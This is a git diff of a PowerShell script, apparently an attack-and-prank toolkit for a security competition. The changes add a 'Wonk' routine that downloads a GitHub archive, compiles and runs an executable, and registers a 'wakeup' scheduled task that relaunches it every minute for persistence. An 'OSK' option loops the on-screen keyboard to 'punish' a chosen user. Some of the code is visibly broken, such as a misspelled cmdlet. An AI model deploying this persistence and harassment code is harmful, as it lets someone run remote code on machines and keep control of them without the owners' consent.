@@ -899,17 +899,34 @@ function Main {
                 "OSK" {
                     continue;
                     # TODO finish fun
+                    # This will only work on Windows 10, removed in Windows 11
 
                     $runUser = $(Write-Host "What user do you want to punish?: " -ForegroundColor Magenta -NoNewline; Read-Host)
                     Start-Job -scriptblock {while (!(Get-Procces -Name "osk.exe")) {Start-Process -FilePath "C:\Windows\System32\osk.exe" -WindowStyle Maximized -RunAs $runUser}}
                 }
 
                 "Wonk" {
+                    # -- download/compile/run Wonk --
+
                     # download the version of dotnet required to run wonk
+                    # note installing the sdk also installs the runtime
                     Invoke-WebRequest "https://dotnet.microsoft.com/en-us/download/dotnet/thank-you/sdk-7.0.202-windows-x64-installer" -OutFile "$env:Userprofile\Desktop\Tools\dotnet7.exe"
                     Invoke-Expression "$env:USERPROFILE\Desktop\Tools\dotnet7.exe"
+                    
+                    # need to refresh the path again to use the cli
+                    $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
+                    
+                    # note url is a placeholder
+                    Invoke-WebRequest "https://github.com/VJMumphrey/CompScripts/archive/refs/heads/main.zip" -Outfile "$env:Userprofile\Desktop\wonk.zip"
+                    Expand-Archive -LiteralPath "$env:Userprofile\Desktop\wonk.zip" -DestinationPath "$env:USERPROFILE\Desktop\Wonk"
 
-                    # TODO fix later 
+                    Set-Location "$env:Userprofile\Desktop\Wonk"
+
+                    dotnet build -c release
+
+                    # TODO test and make sure this starts as intended
+                    Start-Process .\bin\release\net7.0\wonk.exe
+
                     # creates the scheduled task for wonk persistance
                     $action = New-ScheduledTaskAction -Execute "powershell.exe if (Get-Procces -Name wonk.exe) {}else{.\wonk.exe}"
                     $trigger = New-ScheduledTaskTrigger -RepetitionInterval 1mins
@@ -918,9 +935,6 @@ function Main {
                     $task = New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger -Settings $settings
 
                     Register-ScheduledTask "wakeup" -InputObject $task
-
-                    # compile/run wonk
-
                 }
 
                 "blkpwd" {
